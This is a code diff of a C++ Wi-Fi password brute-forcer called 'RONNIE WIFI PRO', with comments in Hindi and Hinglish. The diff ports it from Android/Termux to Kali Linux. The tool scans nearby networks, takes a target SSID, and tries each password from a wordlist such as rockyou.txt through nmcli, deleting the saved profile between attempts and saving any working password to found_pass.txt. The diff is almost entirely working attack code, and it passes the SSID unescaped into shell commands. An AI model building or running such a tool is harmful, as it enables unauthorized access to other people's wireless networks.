@@ -3,7 +3,6 @@
 #include <string>
 #include <fstream>
 #include <unistd.h>
-#include <vector>
 
 using namespace std;
 
@@ -16,35 +15,27 @@ using namespace std;
 
 int main() {
     cout << CYAN << BOLD << "===========================================" << endl;
-    cout << "        RONNIE WIFI PRO (MOBILE/TERMUX)    " << endl;
+    cout << "        RONNIE WIFI PRO (KALI LINUX)       " << endl;
     cout << "===========================================" << RESET << endl;
 
     string card;
-    cout << "ENTER_INTERFACE (wlan0): ";
+    cout << "ENTER_INTERFACE (e.g., wlan0): ";
     getline(cin, card);
 
-    // वाई-फाई स्कैनिंग (Root required on Android)
+    // वाई-फाई स्कैनिंग (Kali Linux के लिए nmcli सबसे बेस्ट है)
     cout << YELLOW << "[*] Scanning for Networks..." << RESET << endl;
-    system("su -c 'cmd -w wifi list-scan-results' || nmcli dev wifi list");
+    system("nmcli dev wifi list");
 
     string target_ssid, wordlist_path;
-    cout << CYAN << "\nTarget SSID: " << RESET; getline(cin >> ws, target_ssid);
+    cout << CYAN << "\nTarget SSID: " << RESET; 
+    getline(cin >> ws, target_ssid);
 
-    // --- मोबाइल स्टोरेज से फाइल चुनने का ऑप्शन ---
-    cout << CYAN << "Wordlist selection mode:\n[1] Enter Path Manually\n[2] Pick from /sdcard/\nCHOOSE: " << RESET;
-    int mode; cin >> mode;
-    if(mode == 2) {
-        system("ls /sdcard/*.txt"); // मोबाइल की मुख्य स्टोरेज की टेक्स्ट फाइलें दिखाएगा
-        cout << "File ka naam likhein: ";
-        string filename; cin >> filename;
-        wordlist_path = "/sdcard/" + filename;
-    } else {
-        cout << "Full path likhein: "; cin >> wordlist_path;
-    }
+    cout << CYAN << "Wordlist Path (e.g., /usr/share/wordlists/rockyou.txt): " << RESET;
+    getline(cin >> ws, wordlist_path);
 
     ifstream file(wordlist_path);
     if (!file.is_open()) {
-        cerr << RED << "Error: Wordlist file nahi mili!" << RESET << endl;
+        cerr << RED << "Error: Wordlist file nahi mili! Path check karein." << RESET << endl;
         return 1;
     }
 
@@ -52,31 +43,53 @@ int main() {
     bool success = false;
     int line_number = 0;
 
+    cout << YELLOW << "\n[!] Starting Attack on: " << target_ssid << RESET << endl;
+
     while (getline(file, current_password)) {
         line_number++;
-        if (current_password.length() < 8) continue;
-        if (!current_password.empty() && current_password.back() == '\r') current_password.pop_back();
+        
+        // पासवर्ड क्लीनिंग (हटाना \r या \n)
+        if (!current_password.empty() && (current_password.back() == '\r' || current_password.back() == '\n')) {
+            current_password.pop_back();
+        }
 
-        cout << RED << "[" << line_number << "] TRYING: " << current_password << RESET << flush;
+        if (current_password.length() < 8) continue; // WPA2 minimum 8 chars
 
-        // Android/Linux Network Manager command
-        string command = "su -c 'svc wifi disable && svc wifi enable' && "; // Reset WiFi
-        command += "nmcli dev wifi connect \"" + target_ssid + "\" password \"" + current_password + "\" > /dev/null 2>&1";
+        cout << "[LINE " << line_number << "] TRYING: " << current_password << flush;
+
+        // पुराने कनेक्शन प्रोफाइल को डिलीट करना ताकि फ्रेश अटेम्प्ट हो सके
+        string del_cmd = "nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1";
+        system(del_cmd.c_str());
+
+        // nmcli के ज़रिए कनेक्ट करने का प्रयास
+        string command = "nmcli dev wifi connect \"" + target_ssid + "\" password \"" + current_password + "\" > /dev/null 2>&1";
         
         int ret = system(command.c_str());
 
         if (ret == 0) {
             cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
+            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << current_password << RESET << endl;
+            
+            // फाइल में सेव करें
             ofstream saveFile("found_pass.txt", ios::app);
-            saveFile << "SSID: " << target_ssid << " | Pass: " << current_password << endl;
+            if (saveFile.is_open()) {
+                saveFile << "SSID: " << target_ssid << " | Password: " << current_password << endl;
+                saveFile.close();
+                cout << CYAN << "[*] Password 'found_pass.txt' me save kar diya gaya hai." << RESET << endl;
+            }
+            
             success = true;
-            break; 
+            break; // सही पासवर्ड मिलते ही रुकें
         } else {
             cout << RED << " -> [FAILED]" << RESET << endl;
         }
-        usleep(500000); 
+        
+        // नेटवर्क कार्ड को रिसेट होने का समय दें (थोड़ा तेज़ किया गया है)
+        usleep(300000); 
     }
 
-    if (!success) cout << RED << "\n[-] Password not found." << RESET << endl;
+    if (!success) cout << RED << "\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;
+
+    file.close();
     return 0;
 }
